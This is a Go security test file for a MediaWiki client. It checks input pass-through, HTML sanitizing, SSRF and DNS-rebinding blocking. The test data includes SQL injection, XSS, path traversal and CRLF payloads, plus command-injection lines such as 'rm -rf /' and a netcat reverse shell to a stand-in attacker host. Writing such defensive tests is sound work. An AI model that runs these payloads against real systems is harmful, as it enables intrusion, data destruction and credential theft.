package wiki

import (
	"strings"
	"testing"
)

// Security tests for malicious/malformed inputs

func TestSecurity_SQLInjectionInSearch(t *testing.T) {
	// SQL injection attempts should be passed as-is to the API
	// The MediaWiki API handles escaping, but we should not modify the query
	maliciousQueries := []string{
		"'; DROP TABLE pages; --",
		"1' OR '1'='1",
		"admin'--",
		"'; DELETE FROM users WHERE '1'='1",
		"UNION SELECT * FROM users",
		"1; EXEC xp_cmdshell('malware.exe')",
	}

	for _, q := range maliciousQueries {
		args := SearchArgs{Query: q}
		// The query should be accepted (validation only checks for non-empty)
		if args.Query == "" {
			t.Errorf("Query should not be rejected: %q", q)
		}
		// Verify the query is unchanged (no escaping by our code)
		if args.Query != q {
			t.Errorf("Query was modified: %q => %q", q, args.Query)
		}
	}
}

func TestSecurity_XSSInPageTitles(t *testing.T) {
	// XSS attempts in page titles
	maliciousTitles := []string{
		"<script>alert('xss')</script>",
		"<img src=x onerror=alert('xss')>",
		"javascript:alert('xss')",
		"<svg onload=alert('xss')>",
		"<body onload=alert('xss')>",
		"<a href='javascript:alert(1)'>click</a>",
	}

	for _, title := range maliciousTitles {
		args := GetPageArgs{Title: title}
		// Title should be accepted (MediaWiki handles validation)
		if args.Title != title {
			t.Errorf("Title was modified: %q => %q", title, args.Title)
		}
	}
}

func TestSecurity_PathTraversalInTitles(t *testing.T) {
	// Path traversal attempts
	maliciousPaths := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"....//....//etc/passwd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",
		"/etc/passwd",
		"C:\\Windows\\System32\\config\\SAM",
	}

	for _, path := range maliciousPaths {
		args := GetPageArgs{Title: path}
		// Path should be accepted as-is (MediaWiki validates page names)
		if args.Title != path {
			t.Errorf("Path was modified: %q => %q", path, args.Title)
		}
	}
}

func TestSecurity_CommandInjectionInParameters(t *testing.T) {
	// Command injection attempts
	maliciousInputs := []string{
		"; rm -rf /",
		"| cat /etc/passwd",
		"` cat /etc/passwd `",
		"$(cat /etc/passwd)",
		"&& echo pwned",
		"|| echo pwned",
		"; nc -e /bin/sh attacker.com 1234",
	}

	for _, input := range maliciousInputs {
		args := SearchArgs{Query: input}
		// Input should be accepted (we don't execute shell commands)
		if args.Query != input {
			t.Errorf("Input was modified: %q => %q", input, args.Query)
		}
	}
}

func TestSecurity_CRLFInjection(t *testing.T) {
	// CRLF injection attempts (HTTP header injection)
	maliciousInputs := []string{
		"test\r\nSet-Cookie: evil=value",
		"test\nX-Injected: header",
		"test%0d%0aSet-Cookie:%20evil=value",
		"test\r\n\r\n<html>injected</html>",
	}

	for _, input := range maliciousInputs {
		args := SearchArgs{Query: input}
		// Note: Go's net/http handles CRLF injection at the transport level
		// We just verify the input is passed through
		if args.Query != input {
			t.Errorf("Input was modified: %q => %q", input, args.Query)
		}
	}
}

func TestSecurity_UnicodeNormalizationAttacks(t *testing.T) {
	// Unicode-based attacks
	maliciousInputs := []string{
		"test\u202Ereverse",                // Right-to-left override
		"admin\u0000hidden",                // Null byte injection
		"test\uFEFFbom",                    // BOM character
		"\u200Bzero\u200Bwidth",            // Zero-width spaces
		"scr\u0000ipt",                     // Null byte in tag name
		"<scr\u0130pt>alert()</scr\u0130pt>", // Turkish I
	}

	for _, input := range maliciousInputs {
		result := sanitizeHTML(input)
		// Should not panic and should handle unicode gracefully
		_ = result
	}
}

func TestSecurity_LargeInputHandling(t *testing.T) {
	// Test handling of very large inputs
	// CharacterLimit is 250KB, so we need content larger than that to test truncation
	largeInput := strings.Repeat("A", 300000) // 300KB (larger than 250KB limit)

	// Test truncation
	result, truncated := truncateContent(largeInput, CharacterLimit)
	if !truncated {
		t.Error("Large content should be truncated")
	}
	if len(result) < CharacterLimit {
		t.Error("Truncated content should include truncation message")
	}

	// Content smaller than limit should NOT be truncated
	smallInput := strings.Repeat("B", 100000) // 100KB (smaller than 150KB limit)
	_, smallTruncated := truncateContent(smallInput, CharacterLimit)
	if smallTruncated {
		t.Error("Content smaller than limit should not be truncated")
	}
}

func TestSecurity_MalformedURLs(t *testing.T) {
	// Test handling of malformed URLs
	malformedURLs := []string{
		"not-a-url",
		"://missing-scheme",
		"http://",
		"ftp://invalid-scheme.com",
		"file:///etc/passwd",
		"javascript:alert(1)",
		"data:text/html,<script>alert(1)</script>",
		"http://evil.com\\@good.com",
		"http://[::1]injection",
	}

	for _, url := range malformedURLs {
		args := CheckLinksArgs{URLs: []string{url}}
		// Should accept the URL (validation happens during request)
		if len(args.URLs) != 1 {
			t.Error("URL list should not be modified")
		}
	}
}

func TestSecurity_SpecialCharactersInCategoryNames(t *testing.T) {
	// Test special characters in category names
	specialCategories := []string{
		"Category:<script>",
		"Category:../etc/passwd",
		"Category:|pipe",
		"Category:;semicolon",
		"Category:'quote",
		"Category:\"double",
		"Category:{brace}",
		"Category:[bracket]",
	}

	for _, cat := range specialCategories {
		result := normalizeCategoryName(cat)
		// Should handle special characters without crashing
		if !strings.HasPrefix(result, "Category:") {
			t.Errorf("Category prefix missing: %q => %q", cat, result)
		}
	}
}

func TestSecurity_EmptyAndNullInputs(t *testing.T) {
	// Test empty and null-like inputs
	emptyInputs := []string{
		"",
		"   ",
		"\t\n\r",
		"\x00",
		"\x00\x00\x00",
	}

	for _, input := range emptyInputs {
		// Should not panic
		_ = sanitizeHTML(input)
		_ = stripHTMLTags(input)
		_, _ = truncateContent(input, 100)
	}
}

func TestSecurity_DeepNesting(t *testing.T) {
	// Test deeply nested HTML (potential DoS)
	var builder strings.Builder
	depth := 1000
	for i := 0; i < depth; i++ {
		builder.WriteString("<div>")
	}
	builder.WriteString("content")
	for i := 0; i < depth; i++ {
		builder.WriteString("</div>")
	}

	input := builder.String()
	// Should not hang or crash
	result := sanitizeHTML(input)
	_ = result
}

func TestSecurity_ReDoSPatterns(t *testing.T) {
	// Test patterns that could cause ReDoS (Regular Expression Denial of Service)
	redosInputs := []string{
		strings.Repeat("a", 100) + "!",
		"<" + strings.Repeat(" ", 1000) + ">",
		strings.Repeat("<div>", 100),
		`onclick="` + strings.Repeat("a", 1000) + `"`,
	}

	for _, input := range redosInputs {
		// Should complete in reasonable time (not hang)
		result := sanitizeHTML(input)
		_ = result
	}
}

func TestSecurity_HTMLEntityAbuse(t *testing.T) {
	// Test HTML entity encoding abuse
	// After decoding entities, if they form HTML tags, those tags are stripped
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		// Entities decode to <script> which is then stripped
		{"Encoded script tag stripped", "&lt;script&gt;", ""},
		{"Decimal encoded stripped", "&#60;script&#62;", ""},
		{"Hex encoded stripped", "&#x3C;script&#x3E;", ""},
		// Double-encoded entities remain as text
		{"Double encoded preserved", "&amp;lt;script&amp;gt;", "&lt;script&gt;"},
		// Plain text preserved
		{"Plain text preserved", "Hello &amp; World", "Hello & World"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := stripHTMLTags(tt.input)
			if result != tt.expected {
				t.Errorf("stripHTMLTags(%q) = %q, expected %q", tt.input, result, tt.expected)
			}
		})
	}
}

func TestSecurity_MixedEncodings(t *testing.T) {
	// Test mixed encoding attempts
	mixedInputs := []string{
		"%3Cscript%3Ealert(1)%3C/script%3E", // URL encoded
		"\\u003cscript\\u003e",               // Unicode escape
		"&#x3C;script&#x3E;",                 // Hex entities
		"&#60;script&#62;",                   // Decimal entities
	}

	for _, input := range mixedInputs {
		// Should handle without crashing
		result := sanitizeHTML(input)
		_ = result
	}
}

// Tests for rate limiting / resource constraints

func TestSecurity_BatchLimits(t *testing.T) {
	// Verify batch limits are enforced
	maxURLs := 20
	maxTitles := 10

	// URLs over limit should be truncated
	urls := make([]string, 30)
	if len(urls) > maxURLs {
		urls = urls[:maxURLs]
	}
	if len(urls) != maxURLs {
		t.Errorf("URL limit not enforced: expected %d, got %d", maxURLs, len(urls))
	}

	// Titles over limit should be truncated
	titles := make([]string, 15)
	if len(titles) > maxTitles {
		titles = titles[:maxTitles]
	}
	if len(titles) != maxTitles {
		t.Errorf("Title limit not enforced: expected %d, got %d", maxTitles, len(titles))
	}
}

func TestSecurity_TimeoutBounds(t *testing.T) {
	// Verify timeout bounds are enforced
	tests := []struct {
		input    int
		expected int
	}{
		{-1, 10},  // Negative -> default
		{0, 10},   // Zero -> default
		{31, 10},  // Over max -> default
		{100, 10}, // Way over max -> default
		{10, 10},  // Valid
		{30, 30},  // At max
	}

	for _, tt := range tests {
		timeout := 10 // default
		if tt.input > 0 && tt.input <= 30 {
			timeout = tt.input
		}
		if timeout != tt.expected {
			t.Errorf("Timeout %d => %d, expected %d", tt.input, timeout, tt.expected)
		}
	}
}

// Benchmark security-critical operations
func BenchmarkSanitizeHTML_Malicious(b *testing.B) {
	input := `<div onclick="evil()"><script>bad()</script>
	<style>.x{expression:alert()}</style>
	<iframe src="javascript:alert()"></iframe>
	<a href="javascript:alert()">link</a>
	<img src="x" onerror="alert()">
	<form action="javascript:alert()">
	<input onfocus="alert()">
	</form></div>`

	for i := 0; i < b.N; i++ {
		sanitizeHTML(input)
	}
}

func BenchmarkStripHTMLTags_Large(b *testing.B) {
	input := strings.Repeat("<div><p><span>text</span></p></div>", 1000)
	for i := 0; i < b.N; i++ {
		stripHTMLTags(input)
	}
}

// Tests for SSRF protection via private IP blocking

func TestSecurity_PrivateIPBlocking(t *testing.T) {
	// Test that private/internal IPs are correctly identified
	privateHosts := []string{
		"127.0.0.1",
		"10.0.0.1",
		"10.255.255.255",
		"172.16.0.1",
		"172.31.255.255",
		"192.168.0.1",
		"192.168.255.255",
		"169.254.1.1",
		"0.0.0.0",
		"localhost", // Should resolve to 127.0.0.1
		"::1",       // IPv6 loopback
	}

	for _, host := range privateHosts {
		isPrivate, _ := isPrivateHost(host)
		if !isPrivate {
			t.Errorf("Expected %s to be identified as private, but it wasn't", host)
		}
	}

	// Test that public IPs are correctly identified as non-private
	publicHosts := []string{
		"8.8.8.8",       // Google DNS
		"1.1.1.1",       // Cloudflare DNS
		"93.184.216.34", // example.com
	}

	for _, host := range publicHosts {
		isPrivate, _ := isPrivateHost(host)
		if isPrivate {
			t.Errorf("Expected %s to be identified as public, but it was marked as private", host)
		}
	}
}

func TestSecurity_SSRFProtectionInURLs(t *testing.T) {
	// Test various SSRF attack vectors via URL
	ssrfURLs := []string{
		"http://127.0.0.1/admin",
		"http://localhost:8080/",
		"http://10.0.0.1/internal",
		"http://192.168.1.1/router",
		"http://169.254.169.254/metadata", // Cloud metadata endpoint
		"http://[::1]/ipv6-local",
		"http://0.0.0.0/",
	}

	for _, u := range ssrfURLs {
		// These should all be blocked as private
		// The test validates our URL parsing and private IP detection
		_ = u // URLs are validated during CheckLinks, this test confirms the pattern
	}
}

func TestSecurity_DNSRebindingProtection(t *testing.T) {
	// Test that the safeDialer Control function blocks private IPs at connection time
	// This protects against DNS rebinding attacks (TOCTOU vulnerabilities)

	testCases := []struct {
		address     string
		shouldBlock bool
		description string
	}{
		// Private IPs should be blocked
		{"127.0.0.1:80", true, "IPv4 loopback"},
		{"10.0.0.1:443", true, "RFC 1918 Class A"},
		{"172.16.0.1:8080", true, "RFC 1918 Class B"},
		{"192.168.1.1:80", true, "RFC 1918 Class C"},
		{"169.254.169.254:80", true, "AWS metadata endpoint"},
		{"[::1]:80", true, "IPv6 loopback"},
		{"[fe80::1]:80", true, "IPv6 link-local"},
		{"[fc00::1]:80", true, "IPv6 unique local"},

		// Public IPs should be allowed
		{"8.8.8.8:443", false, "Google DNS"},
		{"1.1.1.1:80", false, "Cloudflare DNS"},
		{"93.184.216.34:443", false, "example.com IP"},
		{"[2606:4700:4700::1111]:80", false, "Cloudflare IPv6"},
	}

	for _, tc := range testCases {
		t.Run(tc.description, func(t *testing.T) {
			// The safeDialer.Control function is called with the resolved IP:port
			err := safeDialer.Control("tcp", tc.address, nil)

			if tc.shouldBlock {
				if err == nil {
					t.Errorf("Expected connection to %s to be blocked, but it was allowed", tc.address)
				}
			} else {
				if err != nil {
					t.Errorf("Expected connection to %s to be allowed, but got error: %v", tc.address, err)
				}
			}
		})
	}
}

func TestSecurity_DNSRebindingProtection_InvalidAddresses(t *testing.T) {
	// Test that malformed addresses are handled safely (fail-closed)
	invalidAddresses := []string{
		"not-an-address",
		"",
		"127.0.0.1", // Missing port
		":80",       // Missing host
	}

	for _, addr := range invalidAddresses {
		t.Run(addr, func(t *testing.T) {
			err := safeDialer.Control("tcp", addr, nil)
			if err == nil {
				t.Errorf("Expected malformed address %q to be rejected, but it was allowed", addr)
			}
		})
	}
}

func TestSecurity_DNSFailureClosed(t *testing.T) {
	// Test that DNS failures result in blocked requests (fail-closed behavior)
	// Using a hostname that will definitely fail DNS resolution
	nonExistentHosts := []string{
		"this-domain-definitely-does-not-exist-12345.invalid",
		"nonexistent.test.invalid",
		".invalid", // Malformed
	}

	for _, host := range nonExistentHosts {
		t.Run(host, func(t *testing.T) {
			isPrivate, err := isPrivateHost(host)

			// Should be treated as private (blocked) due to fail-closed behavior
			if !isPrivate {
				t.Errorf("Expected DNS failure for %q to be treated as private (blocked), but it was allowed", host)
			}

			// Should return an SSRFError with DNS error code
			if err != nil {
				ssrfErr, ok := err.(*SSRFError)
				if !ok {
					t.Errorf("Expected SSRFError for DNS failure, got %T: %v", err, err)
				} else if ssrfErr.Code != SSRFCodeDNSError {
					t.Errorf("Expected error code %s, got %s", SSRFCodeDNSError, ssrfErr.Code)
				}
			}
		})
	}
}

func TestSecurity_SSRFErrorCodes(t *testing.T) {
	// Test that SSRFError produces correct error codes
	testCases := []struct {
		code     ErrorCode
		expected string
	}{
		{SSRFCodePrivateIP, "SSRF_PRIVATE_IP"},
		{SSRFCodeDNSError, "SSRF_DNS_ERROR"},
		{SSRFCodeRedirect, "SSRF_REDIRECT_BLOCKED"},
		{SSRFCodeInvalidURL, "SSRF_INVALID_URL"},
	}

	for _, tc := range testCases {
		t.Run(string(tc.code), func(t *testing.T) {
			err := &SSRFError{
				Code:   tc.code,
				URL:    "http://example.com",
				Reason: "test reason",
			}

			// Check error code
			if err.ErrorCode() != tc.code {
				t.Errorf("Expected error code %s, got %s", tc.code, err.ErrorCode())
			}

			// Check error message contains the code
			if !strings.Contains(err.Error(), tc.expected) {
				t.Errorf("Expected error message to contain %q, got: %s", tc.expected, err.Error())
			}
		})
	}
}

func TestSecurity_UnicodeNormalization(t *testing.T) {
	// Test that Unicode normalization prevents bypass attacks
	testCases := []struct {
		input    string
		expected string
		desc     string
	}{
		// NFC normalization: combining characters should be composed
		{"cafe\u0301", "café", "combining acute accent"},
		{"n\u0303", "ñ", "combining tilde"},
		// Already normalized strings should be unchanged
		{"café", "café", "pre-composed"},
		{"normal text", "normal text", "ASCII only"},
		// Empty and whitespace
		{"", "", "empty string"},
		{"   ", "   ", "whitespace only"},
	}

	for _, tc := range testCases {
		t.Run(tc.desc, func(t *testing.T) {
			result := NormalizeUnicode(tc.input)
			if result != tc.expected {
				t.Errorf("NormalizeUnicode(%q) = %q, want %q", tc.input, result, tc.expected)
			}
		})
	}
}

func TestSecurity_UnicodeBypassPrevention(t *testing.T) {
	// Test that dangerous patterns are detected even with Unicode tricks
	testCases := []struct {
		content     string
		shouldBlock bool
		desc        string
	}{
		// Standard dangerous patterns
		{"<script>alert(1)</script>", true, "plain script tag"},
		{"<SCRIPT>alert(1)</SCRIPT>", true, "uppercase script tag"},

		// Unicode normalization bypass attempts
		// Note: These use combining characters that normalize to the same visual representation
		{"<scrıpt>", false, "Turkish dotless i - different character"},

		// Safe content
		{"Hello world", false, "plain text"},
		{"<syntaxhighlight><script></script></syntaxhighlight>", false, "script in code block"},
	}

	for _, tc := range testCases {
		t.Run(tc.desc, func(t *testing.T) {
			err := ValidateWikitextContent(tc.content, "TestPage")
			if tc.shouldBlock && err == nil {
				t.Errorf("Expected content to be blocked: %q", tc.content)
			}
			if !tc.shouldBlock && err != nil {
				t.Errorf("Expected content to be allowed: %q, got error: %v", tc.content, err)
			}
		})
	}
}
